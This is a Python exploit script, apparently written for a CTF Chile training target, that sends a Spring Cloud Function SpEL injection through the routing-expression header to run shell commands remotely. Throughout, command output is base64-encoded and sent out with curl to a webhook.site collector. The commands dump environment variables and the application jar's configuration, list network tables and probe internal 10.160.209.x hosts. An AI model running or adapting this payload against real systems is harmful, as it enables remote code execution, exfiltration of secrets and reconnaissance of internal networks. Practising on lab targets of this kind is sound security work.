#!/usr/bin/env python3
"""
CTF Chile - Exploración profunda: app y red interna
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:15} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Explorando aplicación Spring Boot...")
probe("jar_content", "unzip -l /app/app.jar | head -20")
probe("jar_props", "unzip -p /app/app.jar application.properties 2>/dev/null")
probe("jar_yml", "unzip -p /app/app.jar application.yml 2>/dev/null")
probe("jar_bootstrap", "unzip -p /app/app.jar bootstrap.properties 2>/dev/null")

print("[*] Buscando flags en strings de la aplicación...")
probe("jar_strings", "strings /app/app.jar | grep -i 'flag\\|ctf\\|omni' | head -10")
probe("jar_ctfchile", "strings /app/app.jar | grep -i ctfchile | head -5")

print("[*] Explorando red interna...")
probe("netstat", "netstat -tuln 2>/dev/null")
probe("arp_table", "arp -a 2>/dev/null")
probe("route_table", "route -n 2>/dev/null")

print("[*] Escaneando red interna (10.160.209.x)...")
probe("ping_209_1", "timeout 3 ping -c 1 10.160.209.1 && echo 'ALIVE: 10.160.209.1' || echo 'DOWN: 10.160.209.1'")
probe("ping_209_3", "timeout 3 ping -c 1 10.160.209.3 && echo 'ALIVE: 10.160.209.3' || echo 'DOWN: 10.160.209.3'")

print("[*] Probando servicios web internos...")
probe("curl_209_1_80", "timeout 5 curl -s http://10.160.209.1 | head -5 2>/dev/null || echo 'NO_WEB_80'")
probe("curl_209_1_8080", "timeout 5 curl -s http://10.160.209.1:8080 | head -5 2>/dev/null || echo 'NO_WEB_8080'")

print("[*] Variables de entorno detalladas...")
probe("env_all", "env")
probe("java_props", "java -XshowSettings:properties -version 2>&1 | grep -v 'openjdk version' | head -10")

time.sleep(12)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
        except Exception as e:
            print(f"(decode error) {raw[:100]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")